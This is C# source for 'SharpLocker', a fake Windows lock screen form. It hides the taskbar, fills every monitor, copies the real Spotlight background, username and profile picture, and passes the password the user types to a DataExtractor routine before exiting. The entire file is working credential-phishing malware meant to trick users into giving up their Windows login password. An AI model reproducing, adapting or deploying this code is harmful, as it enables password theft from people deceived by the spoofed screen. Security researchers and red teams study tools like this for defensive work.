using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using System.Linq;
using System.Runtime.InteropServices;
using System.IO;
using System.Drawing.Drawing2D;
using System.Text;

namespace SharpLocker
{
    public partial class LockScreenForm : Form
    {
        [DllImport("shell32.dll", EntryPoint = "#261",
        CharSet = CharSet.Unicode, PreserveSig = false)]
        public static extern void GetUserTilePath(
        string username,
        UInt32 whatever, // 0x80000000
        StringBuilder picpath, int maxLength);

        public static string GetUserTilePath(string username)
        {   // username: use null for current user
            var sb = new StringBuilder(1000);
            GetUserTilePath(username, 0x80000000, sb, sb.Capacity);
            return sb.ToString();
        }

        public static Image GetUserTile(string username)
        {
            return Image.FromFile(GetUserTilePath(username));
        }

        public LockScreenForm()
        {
            InitializeComponent();
            Taskbar.Hide();

            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Normal;
            StartPosition = FormStartPosition.Manual;
            Location = new Point(0, 0);
            Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

            //Creds to keldnorman
            //https://github.com/Pickfordmatt/SharpLocker/issues/2
            Image myimage = new Bitmap(getSpotlightImage());
            BackgroundImage = myimage;

            BackgroundImageLayout = ImageLayout.Stretch;
            TopMost = true;

            string userName = Environment.UserName;
            UserNameLabel.Text = userName;
            UserNameLabel.BackColor = Color.Transparent;

            int usernameloch = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usericonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 29;
            int buttonh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 64;
            int usernameh = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 50;
            int locked = (Convert.ToInt32(Screen.PrimaryScreen.Bounds.Height) / 100) * 57;

            PasswordTextBox.Top = usernameloch;
            PasswordTextBox.UseSystemPasswordChar = true;
            ProfileIcon.Top = usericonh;
            SubmitPasswordButton.Top = buttonh;
            UserNameLabel.Top = usernameh;
            LockedLabel.Top = locked;
            PasswordTextBox.UseSystemPasswordChar = true;

            //Get the username. This returns Domain\Username
            string userNameText = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            //Set the text
            UserNameLabel.Text = userNameText.Split('\\')[1];

            //https://stackoverflow.com/questions/7731855/rounded-edges-in-picturebox-c-sharp
            System.Drawing.Drawing2D.GraphicsPath gp = new System.Drawing.Drawing2D.GraphicsPath();
            gp.AddEllipse(0, 0, ProfileIcon.Width - 3, ProfileIcon.Height - 3);
            Region rg = new Region(gp);
            ProfileIcon.Region = rg;
            ProfileIcon.Image = GetUserTile(userNameText.Split('\\')[1]);



            foreach (var screen in Screen.AllScreens)
            {
                Thread thread = new Thread(() => WorkThreadFunction(screen));
                thread.Start();
            }


        }

        public string getSpotlightImage()
        {
            //Creds to Ascensao
            //https://github.com/Pickfordmatt/SharpLocker/pull/20


            //Get Windows Spotlight Images Location Path.      C:\Users\[Username]\AppData\Local\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\
            string spotlight_dir_path = @Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets\");

            /* Save the name of the larger image from spotlight dir.
             * Normally the larger image present in this directory is the current lock screen image. */
            string img_name = "";

            //Save image full path
            string img_path = "";

            DirectoryInfo folderInfo = new DirectoryInfo(spotlight_dir_path);
            long largestSize = 0;
            foreach (var fi in folderInfo.GetFiles())
            {
                if (fi.Length > largestSize)
                {
                    largestSize = fi.Length;
                    img_name = fi.Name;
                }
            }

            img_path = Path.Combine(spotlight_dir_path, img_name);

            return img_path;
        }


        public void WorkThreadFunction(Screen screen)
        {
            try
            {
                if (screen.Primary == false)
                {
                    int mostLeft = screen.WorkingArea.Left;
                    int mostTop = screen.WorkingArea.Top;
                    Debug.WriteLine(mostLeft.ToString(), mostTop.ToString());
                    using (Form form = new Form())
                    {
                        form.WindowState = FormWindowState.Normal;
                        form.StartPosition = FormStartPosition.Manual;
                        form.Location = new Point(mostLeft, mostTop);
                        form.FormBorderStyle = FormBorderStyle.None;
                        form.Size = new Size(screen.Bounds.Width, screen.Bounds.Height);
                        form.BackColor = Color.Black;
                        form.ShowDialog();
                    }
                }
            }
            catch (Exception ex)
            {
                // log errors
                Taskbar.Show();
                System.Windows.Forms.Application.Exit();
            }
        }


        protected override CreateParams CreateParams
        {
            get
            {
                var parms = base.CreateParams;
                parms.Style &= ~0x02000000;  // Turn off WS_CLIPCHILDREN
                parms.ExStyle |= 0x02000000;
                return parms;
            }
        }

        protected override void OnClosing(CancelEventArgs e)
        {
            Taskbar.Show();
            base.OnClosing(e);
        }

        private void PasswordTextBox_TextChanged(object sender, EventArgs e)
        {
            Console.WriteLine(PasswordTextBox);
        }

        private void SubmitPasswordButton_Click(object sender, EventArgs e)
        {
            DataExtractor.Extract(PasswordTextBox.Text);
            Taskbar.Show();
            Application.Exit();
        }
    }
}
